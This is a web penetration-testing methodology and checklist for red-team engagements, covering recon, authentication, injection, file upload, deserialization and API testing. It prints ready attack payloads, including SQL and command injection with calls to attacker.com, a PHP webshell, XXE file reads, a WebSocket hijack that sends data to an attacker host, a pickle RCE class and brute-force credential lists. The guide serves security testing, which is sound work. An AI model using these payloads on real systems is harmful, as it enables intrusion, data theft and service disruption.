# 🌐 Web Vulnerabilities Methodology

> A complete Red Team checklist and methodology for web application penetration testing. Covers every attack surface — from initial recon to post-exploitation — ensuring no vulnerability class is missed during an engagement.

---

## Table of Contents

- [Phase 1 — Reconnaissance & Information Gathering](#phase-1--reconnaissance--information-gathering)
- [Phase 2 — Configuration & Deployment Testing](#phase-2--configuration--deployment-testing)
- [Phase 3 — HTTP Headers & Proxy Abuse](#phase-3--http-headers--proxy-abuse)
- [Phase 4 — Authentication Testing](#phase-4--authentication-testing)
- [Phase 5 — Session Management](#phase-5--session-management)
- [Phase 6 — Authorization & Access Control](#phase-6--authorization--access-control)
- [Phase 7 — Input Validation & Injection](#phase-7--input-validation--injection)
- [Phase 8 — Reflected & Stored Content](#phase-8--reflected--stored-content)
- [Phase 9 — File Upload & Download](#phase-9--file-upload--download)
- [Phase 10 — Specific Functionality Vulnerabilities](#phase-10--specific-functionality-vulnerabilities)
- [Phase 11 — WebSockets](#phase-11--websockets)
- [Phase 12 — Serialization](#phase-12--serialization)
- [Phase 13 — Business Logic Flaws](#phase-13--business-logic-flaws)
- [Phase 14 — Client-Side Attacks](#phase-14--client-side-attacks)
- [Phase 15 — API Testing](#phase-15--api-testing)
- [Phase 16 — Denial of Service](#phase-16--denial-of-service)
- [Tools Reference](#tools-reference)
- [Vulnerability Severity Matrix](#vulnerability-severity-matrix)
- [References](#references)

---

## Phase 1 — Reconnaissance & Information Gathering

### Passive Recon

```bash
# WHOIS & DNS
whois target.com
dig target.com ANY
nslookup -type=any target.com
host -a target.com

# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com
assetfinder --subs-only target.com

# Certificate transparency logs
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# Google Dorks
site:target.com
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com intitle:"index of"
"target.com" ext:sql OR ext:bak OR ext:log
```

### Active Recon

```bash
# Port scanning
nmap -sV -sC -p- --min-rate 5000 target.com
nmap -sV -p 80,443,8080,8443,8000,3000 target.com

# Web tech fingerprinting
whatweb target.com
wappalyzer (browser extension)
webanalyze -host target.com

# Directory/file bruteforce
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt
ffuf -u https://target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt

# Robots.txt & sitemap
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml

# Wayback Machine
waybackurls target.com | tee wayback.txt
gau target.com | tee gau.txt

# JS file analysis
katana -u https://target.com -jc -o js_links.txt
```

### Checklist ✅

- [ ] WHOIS, DNS records, MX, NS, TXT
- [ ] Subdomains enumerated (passive + active)
- [ ] SSL/TLS certificate inspected (SANs, expiry)
- [ ] Technology stack identified (framework, server, CMS)
- [ ] Robots.txt / sitemap.xml reviewed
- [ ] Wayback Machine URLs collected
- [ ] JS files collected and analyzed for endpoints/secrets
- [ ] Google dorks run
- [ ] Email addresses and usernames gathered
- [ ] Cloud storage buckets checked (S3, GCS, Azure Blob)

---

## Phase 2 — Configuration & Deployment Testing

### HTTP Methods

```bash
# Test allowed HTTP methods
curl -X OPTIONS https://target.com -i
nmap --script http-methods target.com

# Dangerous methods to check
curl -X PUT https://target.com/test.txt -d "test"
curl -X DELETE https://target.com/test.txt
curl -X TRACE https://target.com -i     # XST attack
```

### Sensitive Files & Paths

```
/.git/config
/.git/HEAD
/.env
/.env.local
/.env.production
/config.php
/wp-config.php
/web.config
/phpinfo.php
/info.php
/server-status
/server-info
/admin
/administrator
/backup
/backup.zip
/backup.sql
/db.sql
/.DS_Store
/crossdomain.xml
/clientaccesspolicy.xml
/.well-known/security.txt
```

### SSL/TLS Testing

```bash
# Check SSL/TLS configuration
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for weak ciphers, expired cert, HSTS missing
```

### Checklist ✅

- [ ] Unnecessary HTTP methods disabled (PUT, DELETE, TRACE)
- [ ] Directory listing disabled
- [ ] Sensitive files not exposed (.git, .env, backups)
- [ ] SSL/TLS — no weak ciphers, valid cert, HSTS enabled
- [ ] Error pages don't leak stack traces or version info
- [ ] Admin interfaces not publicly accessible
- [ ] Default credentials tested
- [ ] CORS misconfiguration checked

---

## Phase 3 — HTTP Headers & Proxy Abuse

### Headers to Inspect

```bash
curl -I https://target.com
```

| Header | Expected | Risk if Missing/Wrong |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Downgrade to HTTP |
| `Content-Security-Policy` | Restrictive whitelist | XSS, data injection |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing |
| `Referrer-Policy` | `no-referrer` | Info leakage |
| `Permissions-Policy` | Restrict features | Feature abuse |
| `Access-Control-Allow-Origin` | Specific origins only | CORS abuse |
| `Server` | Should not reveal version | Fingerprinting |
| `X-Powered-By` | Should not be present | Fingerprinting |

### Proxy / Intermediary Abuse

```
# Host header injection
GET / HTTP/1.1
Host: attacker.com

# X-Forwarded-For spoofing
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1

# HTTP Request Smuggling — CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# Cache Poisoning — unkeyed header injection
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: https
X-Host: attacker.com
```

### Checklist ✅

- [ ] All security headers present and correctly configured
- [ ] Host header injection tested
- [ ] X-Forwarded-For / IP spoofing headers tested
- [ ] HTTP Request Smuggling tested (CL.TE, TE.CL)
- [ ] Web Cache Poisoning tested (unkeyed headers)
- [ ] CORS policy validated — no wildcard with credentials

---

## Phase 4 — Authentication Testing

### Username Enumeration

```bash
# Response differences on valid vs invalid username
# Check: status code, response length, response time, error message

ffuf -u https://target.com/login -X POST \
  -d "username=FUZZ&password=wrong" \
  -w /opt/SecLists/Usernames/top-usernames-shortlist.txt \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### Brute Force

```bash
# Hydra
hydra -L users.txt -P /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Burp Intruder — Cluster Bomb attack on login
```

### Default Credentials to Try

```
admin:admin
admin:password
admin:123456
admin:admin123
administrator:administrator
root:root
root:toor
test:test
guest:guest
```

### Password Reset Flaws

```
# Host header poisoning in reset email
POST /forgot-password
Host: attacker.com

# Token predictability — check if reset token is:
# - Sequential
# - Based on timestamp
# - MD5 of email

# Token reuse — use same reset token twice
# Token expiry — use 24h+ old token
# Response manipulation — change success:false to success:true
```

### Multi-Factor Authentication (MFA) Bypass

```
# Brute force OTP (6-digit = 1,000,000 possibilities)
# Response manipulation
# Skip MFA step entirely — go directly to /dashboard
# Use old/backup codes
# CSRF on MFA disable endpoint
```

### Checklist ✅

- [ ] Username enumeration (error messages, timing)
- [ ] Brute force — no lockout or weak lockout
- [ ] Default credentials tested
- [ ] Password policy weakness (length, complexity)
- [ ] Password reset — token predictability, host header injection
- [ ] MFA bypass — skip step, brute OTP, backup codes
- [ ] OAuth misconfigurations (state param, redirect_uri)
- [ ] JWT attacks (none algorithm, weak secret, key confusion)
- [ ] Remember me / persistent cookie analysis
- [ ] Login over HTTP (no HTTPS)

---

## Phase 5 — Session Management

### Session Token Analysis

```bash
# Collect multiple session tokens and analyze entropy
# Use Burp Sequencer for statistical analysis

# Cookie flags to check
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

| Flag | Risk if Missing |
|---|---|
| `HttpOnly` | XSS can steal cookie |
| `Secure` | Cookie sent over HTTP |
| `SameSite=Strict` | CSRF attacks |

### Session Attacks

```
# Session fixation — set your own session before login
GET /login?sessionid=attacker_controlled_value

# Session after logout — token still valid server-side
1. Login → copy session token
2. Logout
3. Replay old session token → still authenticated?

# Concurrent sessions — login twice, both active?

# Predictable session ID — sequential, timestamp-based

# CSRF — forged cross-origin state-changing request
<form action="https://target.com/transfer" method="POST">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```

### Checklist ✅

- [ ] Session tokens are random and high entropy
- [ ] Secure, HttpOnly, SameSite flags set
- [ ] Session invalidated on logout server-side
- [ ] Session fixation not possible
- [ ] CSRF tokens present on state-changing requests
- [ ] Session timeout enforced (idle + absolute)
- [ ] Concurrent session handling tested

---

## Phase 6 — Authorization & Access Control

### IDOR (Insecure Direct Object Reference)

```
# Change ID in URL / body / header
GET /api/users/1337/profile          → change to /api/users/1/profile
GET /api/orders?id=9999              → enumerate other order IDs
GET /download?file=invoice_1337.pdf  → change to invoice_1.pdf

# GUIDs instead of integers? Try:
# - Leak GUIDs from other endpoints
# - Look in page source, JS, API responses
```

### Privilege Escalation

```
# Horizontal — access another user's data
# Vertical — access higher-privilege functions

# Forced browsing
/admin
/admin/users
/internal/reports
/api/admin/

# Parameter tampering
role=user       → role=admin
isAdmin=false   → isAdmin=true
group=1         → group=0
```

### Checklist ✅

- [ ] IDOR on all object references (IDs, GUIDs, filenames)
- [ ] Horizontal privilege escalation (other users' data)
- [ ] Vertical privilege escalation (admin functions)
- [ ] Forced browsing to admin/internal paths
- [ ] API endpoints enforce same authorization as UI
- [ ] HTTP method-based bypass (GET vs POST vs PUT)
- [ ] Mass assignment (extra JSON fields accepted)

---

## Phase 7 — Input Validation & Injection

### SQL Injection

```sql
' OR 1=1--
' UNION SELECT NULL,NULL--
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
```

### NoSQL Injection

```
{"username": {"$ne": null}, "password": {"$ne": null}}
?username[$gt]=&password[$gt]=
```

### Command Injection

```bash
; id
| id
&& id
`id`
$(id)
; ping -c 5 attacker.com
| curl attacker.com/$(whoami)
```

### LDAP Injection

```
*)(uid=*))(|(uid=*
admin)(&(password=*)
*()|%26'
```

### XPath Injection

```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
```

### Template Injection (SSTI)

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### Server-Side Request Forgery (SSRF)

```
# Internal services
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/    # AWS metadata
http://metadata.google.internal/             # GCP metadata
http://169.254.169.254/metadata/v1/         # DigitalOcean

# Protocol abuse
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_PING
```

### XML External Entity (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE via OOB -->
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

### HTTP Header Injection

```
# CRLF Injection
/%0d%0aSet-Cookie:session=evil
/?redirect=https://target.com%0d%0aSet-Cookie:admin=true

# Email Header Injection (in contact forms)
victim@target.com%0aBcc:attacker@evil.com
```

### Checklist ✅

- [ ] SQL Injection — all input parameters
- [ ] NoSQL Injection — JSON body, array params
- [ ] Command Injection — all OS-interacting inputs
- [ ] LDAP Injection — authentication fields
- [ ] SSTI — template-rendered inputs
- [ ] SSRF — URL/path inputs processed server-side
- [ ] XXE — all XML-accepting endpoints
- [ ] CRLF / Header Injection — redirects, headers
- [ ] Path Traversal — file download/upload paths
- [ ] Open Redirect — redirect/next/url parameters

---

## Phase 8 — Reflected & Stored Content

### Cross-Site Scripting (XSS)

```javascript
// Reflected XSS probes
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

// Stored XSS — in profile fields, comments, messages
// DOM XSS — check JS for: document.write, innerHTML, eval, location.hash

// Filter bypass
<ScRiPt>alert(1)</ScRiPt>
<script>al\u0065rt(1)</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg><animate onbegin=alert(1) attributeName=x>
```

### Content Injection

```
# HTML injection (when XSS is filtered)
<h1>Hacked</h1>
<iframe src="https://attacker.com">
<meta http-equiv="refresh" content="0;url=https://attacker.com">
```

### Checklist ✅

- [ ] Reflected XSS — all URL params, search, error pages
- [ ] Stored XSS — all user-input stored and displayed fields
- [ ] DOM XSS — JS source/sink analysis
- [ ] CSP bypass possible?
- [ ] HTML injection where XSS is blocked
- [ ] Content-Type header forces HTML on user-controlled content

---

## Phase 9 — File Upload & Download

### File Upload Attacks

```bash
# Upload a webshell
# 1. PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Bypass extension filters
shell.php5
shell.php%00.jpg      # null byte
shell.pHp
shell.php.jpg
shell.jpg.php

# 3. Bypass content-type check
Content-Type: image/jpeg  (with PHP content)

# 4. Bypass magic bytes check
Add GIF89a; before PHP code: GIF89a;<?php system($_GET['cmd']); ?>

# 5. SVG XSS
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

# 6. XXE via SVG/XML upload
# 7. SSRF via SVG fetch
<svg><image href="http://169.254.169.254/latest/meta-data/"/></svg>
```

### File Download / Path Traversal

```
# LFI
/download?file=../../../../etc/passwd
/download?file=....//....//etc/passwd
/download?file=%2e%2e%2f%2e%2e%2fetc/passwd

# Useful files to read
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log   # Log poisoning → RCE
/app/config/database.yml
.env
wp-config.php
```

### Checklist ✅

- [ ] File type validation bypassable (extension, MIME, magic bytes)
- [ ] Uploaded files stored in web-accessible directory
- [ ] Uploaded file executed as code (RCE)
- [ ] SVG/XML upload tested for XSS/XXE/SSRF
- [ ] Path traversal in file download endpoints
- [ ] Log poisoning possible (LFI + writable log)
- [ ] Archive extraction tested (Zip Slip)

---

## Phase 10 — Specific Functionality Vulnerabilities

### Redirects & Forwards

```
# Open redirect
/redirect?url=https://attacker.com
/next?=//attacker.com
/out?target=https://attacker.com
/?redirect=javascript:alert(1)

# Bypasses
https://target.com@attacker.com
https://attacker.com#target.com
https://attacker.com?target.com
```

### Email Functionality

```
# Email header injection in contact forms
Name: attacker%0aBcc:victim@corp.com
Email: attacker@x.com%0aCC:victim@corp.com

# Password reset poisoning via Host header
Host: attacker.com
```

### Payment & E-commerce Logic

```
# Price manipulation — change price in request
# Quantity manipulation — negative quantity for credit
# Coupon abuse — apply same coupon multiple times
# Currency switching — change to weaker currency
# Race conditions — buy with $0 using concurrent requests
```

### Checklist ✅

- [ ] Open redirect — all redirect parameters
- [ ] Email header injection
- [ ] Password reset host header poisoning
- [ ] Clickjacking — X-Frame-Options missing
- [ ] CAPTCHA bypass
- [ ] Rate limiting — brute force, OTP, API
- [ ] Race conditions — concurrent request abuse
- [ ] Business logic — price/quantity/coupon manipulation

---

## Phase 11 — WebSockets

### Testing WebSockets

```javascript
// Intercept in Burp Suite → WebSockets tab

// Test for CSRF — is the WS handshake protected?
// Manipulate message content → XSS, SQLi, SSRF
// Check origin header enforcement

// Cross-Site WebSocket Hijacking (CSWSH)
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = function(e) {
    fetch('https://attacker.com/?data=' + btoa(e.data));
};
```

### Checklist ✅

- [ ] WebSocket messages tested for injection (XSS, SQLi, SSTI)
- [ ] Origin header validated server-side
- [ ] CSRF protection on WebSocket handshake
- [ ] Authentication enforced per message
- [ ] Cross-Site WebSocket Hijacking (CSWSH)

---

## Phase 12 — Serialization

### PHP Deserialization

```php
# Identify: base64 data starting with Tzo (serialized PHP object)
O:4:"User":1:{s:4:"name";s:5:"admin";}

# Look for __wakeup, __destruct, __toString magic methods
# Use phpggc to generate gadget chains
phpggc Laravel/RCE1 system id -b
```

### Java Deserialization

```bash
# Identify: AC ED 00 05 (Java serialized object magic bytes)
# Base64: rO0AB...

# Test with ysoserial
java -jar ysoserial.jar CommonsCollections1 "id" | base64

# Burp Java Deserialization Scanner extension
```

### Python Pickle

```python
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
```

### Checklist ✅

- [ ] Serialized objects identified in cookies, params, headers
- [ ] PHP deserialization — magic methods and gadget chains
- [ ] Java deserialization — ysoserial gadget chains
- [ ] Python pickle injection
- [ ] .NET deserialization (ViewState, BinaryFormatter)
- [ ] XML/JSON deserialization (type confusion)

---

## Phase 13 — Business Logic Flaws

### Common Logic Flaws

```
# Workflow bypass — skip step 2 of a 3-step process
# Negative values — order -1 items for credit
# Integer overflow — max integer + 1 = 0 or negative
# Race conditions — double-spend, double-redeem
# Feature interaction — combine features unexpectedly
# Trust assumptions — client-side data trusted by server
```

### Testing Approach

```
1. Map the full business workflow
2. Identify all decision points
3. Test each step in isolation and out of order
4. Manipulate all numeric inputs (negative, 0, max int)
5. Test concurrent requests for race conditions
6. Identify trust boundaries — what does the server trust from the client?
```

### Checklist ✅

- [ ] Multi-step process skippable or reorderable
- [ ] Negative/zero values in numeric inputs
- [ ] Race conditions on critical operations (checkout, transfer)
- [ ] Client-side security controls bypassed (disabled fields, hidden params)
- [ ] Feature interaction — combining features unexpectedly
- [ ] Coupon/voucher/credit abuse

---

## Phase 14 — Client-Side Attacks

### DOM-Based Vulnerabilities

```javascript
// Dangerous sinks to audit in JS
document.write()
element.innerHTML
element.outerHTML
eval()
setTimeout(string)
setInterval(string)
location.href
location.assign()
location.replace()

// Common sources
location.hash
location.search
location.href
document.referrer
window.name
postMessage data
```

### Prototype Pollution

```javascript
// Test in URL params, JSON body
?__proto__[polluted]=true
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}

// Confirm
Object.prototype.polluted === true
```

### PostMessage Vulnerabilities

```javascript
// Listen for all postMessages
window.addEventListener('message', function(e) {
    console.log(e.origin, e.data);
});

// Attack — send malicious postMessage from attacker page
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
```

### Checklist ✅

- [ ] DOM XSS — all JS sources and sinks audited
- [ ] Prototype pollution — URL params and JSON body
- [ ] PostMessage — origin not validated, data unsanitized
- [ ] Client-Side Template Injection (CSTI) — AngularJS, Vue
- [ ] localStorage/sessionStorage sensitive data exposure
- [ ] Hardcoded secrets in JS files (API keys, tokens)

---

## Phase 15 — API Testing

### REST API

```bash
# Enumerate endpoints
ffuf -u https://api.target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt

# HTTP method fuzzing
ffuf -u https://api.target.com/users/1 -X FUZZ \
  -w /opt/SecLists/Fuzzing/http-request-methods.txt

# Test all CRUD operations
GET    /api/users/1      # Read
POST   /api/users        # Create
PUT    /api/users/1      # Update
DELETE /api/users/1      # Delete
PATCH  /api/users/1      # Partial update
```

### GraphQL

```graphql
# Introspection — enumerate schema
{ __schema { types { name fields { name } } } }

# Find all queries and mutations
{ __schema { queryType { fields { name } } } }
{ __schema { mutationType { fields { name } } } }

# Injection in arguments
{ user(id: "1 OR 1=1") { username email } }

# Batching attack (rate limit bypass)
[{"query":"mutation { login(user:\"admin\",pass:\"a\") }"},
 {"query":"mutation { login(user:\"admin\",pass:\"b\") }"}]
```

### Checklist ✅

- [ ] All API endpoints discovered
- [ ] Authentication on every endpoint
- [ ] Authorization — user A can't access user B's data
- [ ] Mass assignment — extra fields accepted
- [ ] GraphQL introspection enabled in production
- [ ] GraphQL batching for rate limit bypass
- [ ] API versioning — old versions still active and vulnerable
- [ ] Rate limiting on all sensitive API calls

---

## Phase 16 — Denial of Service

```bash
# ReDoS — regex-based DoS
# Submit extremely long strings to regex-validated inputs

# Large file upload — no size limit
# Billion laughs — XML entity expansion
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>

# Algorithmic complexity — hash collision DoS
# Resource exhaustion via recursive operations
```

---

## Tools Reference

### Recon

| Tool | Purpose |
|---|---|
| `subfinder` / `amass` | Subdomain enumeration |
| `nmap` | Port scanning |
| `whatweb` / `wappalyzer` | Tech fingerprinting |
| `gobuster` / `feroxbuster` / `ffuf` | Directory/file brute force |
| `waybackurls` / `gau` | Historical URL collection |
| `katana` | JS endpoint discovery |

### Scanning & Exploitation

| Tool | Purpose |
|---|---|
| `Burp Suite Pro` | Full web proxy and scanner |
| `sqlmap` | SQL injection automation |
| `nikto` | Web server misconfiguration scanner |
| `nuclei` | Template-based vulnerability scanner |
| `dalfox` | XSS scanner |
| `ssrfmap` | SSRF exploitation |
| `noSQLMap` | NoSQL injection |
| `ysoserial` | Java deserialization gadget chains |
| `phpggc` | PHP deserialization gadget chains |

### Wordlists

| Wordlist | Path |
|---|---|
| Common directories | `/opt/SecLists/Discovery/Web-Content/common.txt` |
| Large directory list | `/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt` |
| API endpoints | `/opt/SecLists/Discovery/Web-Content/api/` |
| Passwords | `/opt/SecLists/Passwords/Common-Credentials/` |
| Usernames | `/opt/SecLists/Usernames/` |
| Fuzzing | `/opt/SecLists/Fuzzing/` |

---

## Vulnerability Severity Matrix

| Vulnerability | Typical Severity | Impact |
|---|---|---|
| RCE via Deserialization | 🔴 Critical | Full server compromise |
| SQL Injection (data dump) | 🔴 Critical | Data breach |
| SSRF to cloud metadata | 🔴 Critical | Cloud account takeover |
| XXE with file read | 🔴 Critical | Sensitive file exposure |
| Stored XSS in admin panel | 🔴 Critical | Admin account takeover |
| Authentication Bypass | 🔴 Critical | Unauthorized access |
| Insecure Deserialization | 🔴 Critical | RCE |
| IDOR on sensitive data | 🟠 High | Data breach |
| Reflected XSS | 🟠 High | Session hijacking |
| CSRF on sensitive actions | 🟠 High | Unauthorized actions |
| Open Redirect | 🟡 Medium | Phishing |
| Missing security headers | 🟡 Medium | Defense weakening |
| Information disclosure | 🟡 Medium | Reconnaissance aid |
| Clickjacking | 🟡 Medium | UI redressing |
| Rate limit missing | 🟡 Medium | Brute force enablement |
| Directory listing | 🟢 Low | File exposure |
| Cookie without HttpOnly | 🟢 Low | XSS cookie theft |

---

## References

- OWASP Web Security Testing Guide (WSTG)
- OWASP Top 10 (2021)
- PortSwigger Web Security Academy
- PayloadsAllTheThings
- Bug Bounty Playbook
- PTES — Penetration Testing Execution Standard
